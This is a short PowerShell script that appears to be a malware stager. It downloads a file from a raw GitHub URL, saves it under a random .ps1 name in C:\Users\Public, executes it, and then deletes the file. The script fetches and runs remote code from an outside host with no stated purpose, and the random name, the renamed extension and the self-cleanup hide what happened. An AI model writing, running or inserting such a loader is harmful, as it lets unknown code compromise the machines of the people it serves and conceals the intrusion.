$url = "raw.githubusercontent.com/robotinsideus12/trust/refs/heads/main/try.sls"


$randomFileName = (Get-Random).ToString() + ".ps1"
$filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName

Write-Host "file created $filePath"

try {
    # SAVE
    Invoke-RestMethod -Uri $url | Set-Content -Path $filePath

    # 3. START
    & $filePath
    
    Write-Host "scrypt started"
}
catch {
    # ERR
    Write-Error "error: $($_.Exception.Message)"
}
finally {
    # 4. DEL
    if (Test-Path $filePath) {
        Remove-Item $filePath
        Write-Host "tmp '$filePath' del."
    }
}
